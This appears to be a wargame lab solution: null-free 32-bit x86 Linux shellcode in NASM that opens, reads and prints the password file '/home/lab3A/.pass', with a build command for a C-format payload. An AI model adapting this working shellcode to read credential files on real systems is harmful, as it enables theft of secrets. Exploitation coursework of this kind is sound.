; nasm shellcode.asm -o sc && sickle -r sc -f c

[bits 32]
[section .text]

global _start

_start:
  jmp get_file

open_fd:
  ; int open(const char *pathname, int flags);
  pop ebx      ; place pointer to filename into EBX
  xor eax,eax  ; zero out EAX for MOV instruction
  mov al,0x05  ; sys_open()
  xor ecx,ecx  ; zero out ECX (O_RDONLY == 00)
  int 0x80     ; syscall
  ; open(): returns FD in EAX
read_fd:
  ; ssize_t read(int fd, void *buf, size_t count);
  xor ebx,ebx  ; zero out EBX
  mov bl,al    ; MOV FD into EBX
  xor eax,eax  ; zero out EAX
  mov al,0x3   ; sys_read()
  mov ecx,esp  ; *buf -> stack
  xor edx,edx  ; zero out EDX
  add dl,0xff  ; read 255 bytes
  int 0x80     ; syscall
  ; read(): returns size in EAX, and buffer on stack
write_fd:
  xor ebx,ebx  ; zero out EBX
  mov bl,1     ; write to FD(1 == STDOUT)
  mov ecx,esp  ; *buf (stored on stack by read())
  mov edx,eax  ; length of the buffer (returned by read())
  mov al,4     ; sys_write()
  int 0x80     ; syscall
exit:
  xor eax,eax  ; zero out register
  mov al,1     ; sys_exit()
  mov bl,al    ; sys_exit(1) -> avoids nulls
  int 0x80     ; syscall

get_file:
  call open_fd
  filename: db "/home/lab3A/.pass"
